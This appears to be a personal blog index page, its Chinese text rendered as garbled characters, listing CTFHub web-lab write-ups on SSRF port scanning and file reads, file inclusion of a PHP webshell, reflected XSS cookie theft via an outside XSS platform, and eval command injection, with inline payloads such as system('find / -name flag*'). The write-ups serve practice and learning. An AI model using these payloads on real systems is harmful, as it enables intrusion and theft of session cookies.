  <time class="dt-published" datetime="2022-10-15T03:55:22.000Z" itemprop="datePublished">2022-10-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/">CTFHUB-SSRF-ç«¯å£æ‰«æ</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>é¢˜ç›®æœ‰ä¸ªæç¤ºï¼Œ</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/1.png"></p>
<p>é‚£å°±æ‰¹é‡è®¿é—®8000-9000ç«¯å£å‘—ï¼Œè¿›å…¥é¶æœºï¼Œå•¥éƒ½æ²¡æœ‰ï¼Œåªæœ‰URLé‡Œæœ‰ä¸ªå¾…å†™å‚æ•°ï¼Œ</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/2.png"></p>
<p>é‚£å°±æŠ“åŒ…å›¾ç¤ºåŒ…ç„¶åæ‰¹é‡è®¿é—®æœ¬æœºç«¯å£ï¼Œ</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/3.png"></p>
<p>ç»™ç«¯å£åŠ ä¸Šå˜é‡ï¼Œç„¶åè®¾ç½®èŒƒå›´ä¸º8000-9000ï¼Œ</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/4.png"></p>
<p>æœ€åæŒ‰é•¿åº¦æ’åºï¼Œå‘ç°8791ç«¯å£é•¿åº¦ä¸å…¶ä»–çš„ä¸åŒï¼Œæ‰“å¼€å‘ç°flagï¼Œ</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/0.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" data-id="cl9hxo4gx000420v4foe8bks1" data-title="CTFHUB-SSRF-ç«¯å£æ‰«æ" class="article-share-link">åˆ†äº«</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CTFHUB-SSRF-ä¼ªåè®®è¯»å–æ–‡ä»¶" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/" class="article-date">
  <time class="dt-published" datetime="2022-10-15T02:22:31.000Z" itemprop="datePublished">2022-10-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/">CTFHUB-SSRF-ä¼ªåè®®è¯»å–æ–‡ä»¶</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>å‰ç½®çŸ¥è¯†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpä¼ªåè®®ï¼šhttps://blog.csdn.net/cosmoslin/article/details/120695429</span><br></pre></td></tr></table></figure>

<p>æ‰“å¼€é¢˜ç›®é¡µé¢ï¼Œæœ‰ä¸ªæç¤ºï¼Œ</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/4.png"></p>
<p>ç½‘ç«™æœåŠ¡å™¨ç³»ç»Ÿä¸€èˆ¬éƒ½æ˜¯linuxï¼Œé‚£ä¹ˆlinuxç½‘é¡µwebé»˜è®¤ç›®å½•åœ¨å“ªå‘¢ï¼Ÿç›´æ¥ç™¾åº¦ä¸‹ï¼Œ</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/03.png"></p>
<p>é‚£ä¹ˆåªéœ€è¦è¯»å–è¯¥ç›®å½•ä¸‹çš„flag.phpåº”è¯¥å°±è¡Œäº†ï¼Œä¼ªåè®®æœ‰å¾ˆå¤šï¼Œä½†æ˜¯æœ‰çš„ä¸èƒ½ä½¿ç”¨ï¼Œæ‰€ä»¥éœ€è¦æµ‹è¯•å“ªäº›æ˜¯å¯ç”¨çš„ï¼Œå…ˆæµ‹è¯•php:&#x2F;&#x2F;filteråè®®ï¼Œä¸å¯ç”¨ã€‚</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/02.png"></p>
<p>æµ‹è¯•fileåè®®ï¼Œå‘ç°å¯ç”¨ã€‚</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/2.png"></p>
<p>æŠŠè·¯å¾„æ¢ä¸º&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpï¼Œ</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/7.png"></p>
<p>å‘ç°è®¿é—®æˆåŠŸäº†ï¼Œä½†æ˜¯æ²¡æ˜¾ç¤ºflagï¼ŒçŒœæƒ³æ˜¯ä¸æ˜¯åœ¨æ³¨é‡Šé‡Œé¢ï¼Œçœ‹ä¸‹æºç ï¼Œæ‰¾åˆ°flag</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/0.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/15/CTFHUB-SSRF-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/" data-id="cl9hxo4h8000920v491mjggmk" data-title="CTFHUB-SSRF-ä¼ªåè®®è¯»å–æ–‡ä»¶" class="article-share-link">åˆ†äº«</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CTFHUB-SSRF-å†…ç½‘è®¿é—®" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/15/CTFHUB-SSRF-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE/" class="article-date">
  <time class="dt-published" datetime="2022-10-15T02:14:30.000Z" itemprop="datePublished">2022-10-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/15/CTFHUB-SSRF-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE/">CTFHUB-SSRF-å†…ç½‘è®¿é—®</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>é¢˜ç›®æœ‰ä¸ªæç¤ºï¼Œ</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE/0.png"></p>
<p>é‚£åº”è¯¥å°±æ˜¯ä¼ å…¥ä¸€ä¸ª 127.0.0.1&#x2F;flag.phpçš„URLï¼Œ</p>
<p>è¿›å…¥é¶æœºåï¼Œå‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œåªåœ¨URLé‡Œå‘ç°ä¸€ä¸ªä¼ å‚çš„åœ°æ–¹ï¼Œ</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE/1.png"></p>
<p>é‚£å°±è¯•ç€ä¼  ?url&#x3D;127.0.0.1&#x2F;flag.phpï¼Œç›´æ¥å‘ç°flag</p>
<p><img src="/2022/10/15/CTFHUB-SSRF-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE/2.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/15/CTFHUB-SSRF-%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE/" data-id="cl9hxo4gu000220v4a1ii59pg" data-title="CTFHUB-SSRF-å†…ç½‘è®¿é—®" class="article-share-link">åˆ†äº«</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CTFHUB-RCE-æ–‡ä»¶åŒ…å«" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
  <time class="dt-published" datetime="2022-10-15T01:44:50.000Z" itemprop="datePublished">2022-10-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">CTFHUB-RCE-æ–‡ä»¶åŒ…å«</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>è¿›å…¥é¶æœºï¼Œå‘ç°å‡ è¡Œä»£ç ï¼Œ</p>
<p><img src="/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/0.png"></p>
<p>æœ‰æ–‡ä»¶åŒ…å«ä»£ç ï¼Œæœ‰ä¸€ä¸ªå­—ç¬¦flagè¿‡æ»¤ï¼Œæ ¹æ®ä¸‹é¢çš„shellæç¤ºï¼Œç‚¹è¿›å»ï¼Œ</p>
<p><img src="/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png"></p>
<p>å‘ç°æ˜¯ä¸€ä¸ªphpä¸€å¥è¯æœ¨é©¬ï¼Œè¿æ¥å¯†ç æ˜¯ctfhubï¼Œåœ¨æ–‡ä»¶shell.txté‡Œï¼Œè¿™æ—¶å°±è¦æƒ³åˆ°åº”è¯¥ç”¨èšå‰‘è¿æ¥äº†ï¼Œç°ç”¨GETæ–¹æ³•ä¼ file&#x3D;shell.txtï¼Œ</p>
<p><img src="/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.png"></p>
<p>æ–‡ä»¶åŒ…å«æˆåŠŸï¼Œæ‰“å¼€èšå‰‘ï¼Œæ·»åŠ ç½‘ç«™URLï¼Œ</p>
<p><img src="/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/3.png"></p>
<p>è¿æ¥æˆåŠŸåï¼Œåœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°äº†flagï¼Œ</p>
<p><img src="/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/4.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/15/CTFHUB-RCE-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-id="cl9hxo4gp000020v4cad53qob" data-title="CTFHUB-RCE-æ–‡ä»¶åŒ…å«" class="article-share-link">åˆ†äº«</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CTFHUB-XSS-åå°„å‹" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/14/CTFHUB-XSS-%E5%8F%8D%E5%B0%84%E5%9E%8B/" class="article-date">
  <time class="dt-published" datetime="2022-10-14T10:14:08.000Z" itemprop="datePublished">2022-10-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/14/CTFHUB-XSS-%E5%8F%8D%E5%B0%84%E5%9E%8B/">CTFHUB-XSS-åå°„å‹</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>è¿›å…¥é¶æœºï¼Œå‘ç°é¡µé¢</p>
<p><img src="/2022/10/14/CTFHUB-XSS-%E5%8F%8D%E5%B0%84%E5%9E%8B/5.png"></p>
<p>å…ˆåœ¨ç¬¬ä¸€ä¸ªæ¡†æ¡†é‡Œè¾“å…¥<code>&lt;script&gt;alert(&quot;ssss&quot;)&lt;/script&gt;</code>æµ‹è¯•è¯¥é¡µé¢æ˜¯å¦æœ‰xssæ¼æ´ï¼Œç‚¹å‡»â€œsendâ€æŒ‰é’®å‘ç°å¼¹å‡ºé¡µé¢</p>
<p><img src="/2022/10/14/CTFHUB-XSS-%E5%8F%8D%E5%B0%84%E5%9E%8B/3.png"></p>
<p>è¯æ˜æœ‰xssæ¼æ´ï¼Œç„¶åæ‰“å¼€ä¸€ä¸ªåœ¨çº¿xsså¹³å°ç½‘ç«™ï¼Œæˆ‘ä»¬çŸ¥é“xssæ¼æ´ä¸€èˆ¬ç”¨æ¥è·å–cookieå€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è¯•ç€è¾“å…¥<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>è·å–cookieï¼Œå‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆä¿¡æ¯ã€‚</p>
<p>æƒ³äº†ä¸€ä¼šæ‰æƒ³æ˜ç™½ï¼Œ<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>åªèƒ½è·å–è‡ªå·±çš„cookieï¼Œæˆ‘ä»¬åœ¨æ§åˆ¶å°ä¹Ÿå¯ä»¥è·å–è‡ªå·±çš„cookieï¼Œflagè‚¯å®šä¸ä¼šè—åœ¨è‡ªå·±çš„cookieé‡Œé¢ã€‚æ‰€ä»¥è¯•ç€ç”¨xsså¹³å°<a target="_blank" rel="noopener" href="https://xss.yt/%E8%8E%B7%E5%8F%96cookie%EF%BC%8C">https://xss.yt/è·å–cookieï¼Œ</a></p>
<p>ç™»å½•åˆ°å¹³å°ï¼Œåˆ›å»ºä¸€ä¸ªæ–°é¡¹ç›®ï¼Œé…ç½®ä¸ºé»˜è®¤ï¼Œå¦‚ä¸‹</p>
<p><img src="/2022/10/14/CTFHUB-XSS-%E5%8F%8D%E5%B0%84%E5%9E%8B/8.png"></p>
<p>ç„¶åè¿›å…¥è¿›å…¥é¡¹ç›®ï¼ŒæŸ¥çœ‹xssä»£ç ï¼Œ</p>
<p><img src="/2022/10/14/CTFHUB-XSS-%E5%8F%8D%E5%B0%84%E5%9E%8B/4.png"></p>
<p>å¤åˆ¶ä»£ç ï¼Œç„¶åæŠŠç½‘ç«™URLç²˜è´´è¿›ç¬¬äºŒä¸ªæ¡†æ¡†é‡Œï¼Œå¹¶ä¸”nameå€¼ä¸ºå¤åˆ¶çš„xssä»£ç ï¼Œæäº¤ï¼Œç„¶åå»xsså¹³å°ä¸ŠæŸ¥çœ‹ï¼Œå‘ç°flagåœ¨cookieé‡Œ</p>
<p><img src="/2022/10/14/CTFHUB-XSS-%E5%8F%8D%E5%B0%84%E5%9E%8B/0.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/14/CTFHUB-XSS-%E5%8F%8D%E5%B0%84%E5%9E%8B/" data-id="cl9hxo4h5000620v4creahzop" data-title="CTFHUB-XSS-åå°„å‹" class="article-share-link">åˆ†äº«</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-CTFHUB-RCE-evalæ‰§è¡Œ" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/10/14/CTFHUB-RCE-eval%E6%89%A7%E8%A1%8C/" class="article-date">
  <time class="dt-published" datetime="2022-10-14T09:59:29.000Z" itemprop="datePublished">2022-10-14</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/10/14/CTFHUB-RCE-eval%E6%89%A7%E8%A1%8C/">CTFHUB-RCE-evalæ‰§è¡Œ</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>å‰ç½®çŸ¥è¯†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_REQUEST[&quot;å‚æ•°&quot;]å…·ç”¨$_POST[&quot;å‚æ•°&quot;] $_GET[&quot;å‚æ•°&quot;]çš„åŠŸèƒ½,ä½†æ˜¯$_REQUEST[&quot;å‚æ•°&quot;]æ¯”è¾ƒæ…¢ã€‚é€šè¿‡postå’Œgetæ–¹æ³•æäº¤çš„æ‰€æœ‰æ•°æ®éƒ½å¯ä»¥é€šè¿‡$_REQUESTæ•°ç»„[&quot;å‚æ•°&quot;]è·å¾—</span><br></pre></td></tr></table></figure>

<p>è¿›å…¥é¶æœºï¼Œå‘ç°å‡ è¡Œphpä»£ç ï¼Œ</p>
<p><img src="/2022/10/14/CTFHUB-RCE-eval%E6%89%A7%E8%A1%8C/0.png"></p>
<p>ä¸€å¼€å§‹ä¹Ÿä¸çŸ¥é“$_REQUESTæ˜¯ä»€ä¹ˆä¸€å›äº‹ï¼Œä¸ä¼šå°±ç™¾åº¦å•Šï¼Œç„¶åå°±æ˜¯å‰ç½®çŸ¥è¯†é‡Œè®²çš„é‚£æ ·ï¼Œå¯ä»¥ä½¿ç”¨GETæ–¹å¼æäº¤å‚æ•°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨POSTæäº¤ï¼Œè¿™é‡Œæˆ‘æ˜¯ç”¨GETæ–¹å¼æäº¤çš„</p>
<p>ç›´æ¥æäº¤å‚æ•°    ?cmd&#x3D;system(â€œfind &#x2F; -name flag*â€);   æŸ¥æ‰¾æ ¹ç›®å½•ä¸‹æœ‰å«flagå­—ç¬¦çš„æ–‡ä»¶ï¼Œå¦‚å›¾æ‰€ç¤º</p>
<p><img src="/2022/10/14/CTFHUB-RCE-eval%E6%89%A7%E8%A1%8C/1.png"></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯ä¸€ä¸ªä¸€ä¸ªå°è¯•ï¼Œæœ€ç»ˆå‘ç°flagåœ¨æœ€åä¸€ä¸ªæ–‡ä»¶é‡Œï¼Œç„¶åä½¿ç”¨å‘½ä»¤ cat æ–‡ä»¶ | base64 æŸ¥çœ‹æ–‡ä»¶å†…å®¹ï¼Œå‘ç°</p>
<p><img src="/2022/10/14/CTFHUB-RCE-eval%E6%89%A7%E8%A1%8C/2.png"></p>
<p>è§£ç å¾—flag</p>
<p><img src="/2022/10/14/CTFHUB-RCE-eval%E6%89%A7%E8%A1%8C/3.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2022/10/14/CTFHUB-RCE-eval%E6%89%A7%E8%A1%8C/" data-id="cl9hxo4h3000520v489yu64c2" data-title="CTFHUB-RCE-evalæ‰§è¡Œ" class="article-share-link">åˆ†äº«</a>
      
      
      
    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">ä¸‹ä¸€é¡µ &raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">åˆ†ç±»</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTFHUB-web-writeup/">CTFHUB_web_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-web-writeup/">CTF_web_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%89%8D%E7%AB%AF/">webå‰ç«¯</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">å…¶ä»–</a></li></ul>
    </div>
  </div>


  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">å½’æ¡£</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">åä¸€æœˆ 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/10/">åæœˆ 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">æœ€æ–°æ–‡ç« </h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/11/21/%E5%A4%8D%E6%B4%BBGoogle%E7%BF%BB%E8%AF%91/">å¤æ´»Googleç¿»è¯‘</a>
          </li>
        
          <li>
            <a href="/2022/10/20/NSSCTF-SWPUCTF-ez-ez-unserialize/">ç”±NSSCTF-SWPUCTF-ez_ez_unserializeï¼Œå¼•å‘å¯¹ååºåˆ—å…·ä½“è¯¦ç»†è¿‡ç¨‹ä»¥åŠå¯¹__constructï¼Œ__destructå‡½æ•°æ‰§è¡Œæƒ…å†µæ·±åº¦åˆ†æ</a>
          </li>
        
          <li>
            <a href="/2022/10/19/NSWSTAR-week2-UnserializeOne/">NSWSTAR-week2-UnserializeOne</a>
          </li>
        
          <li>
            <a href="/2022/10/16/NSSCTF-HNCTF-Week1-Challenge-rce/">NSSCTF-HNCTF-[Week1]Challenge__rce</a>
          </li>
        
          <li>
            <a href="/2022/10/15/CTFHUB-SSRF-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/">CTFHUB-SSRF-ç«¯å£æ‰«æ</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2022 Zhsgo Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>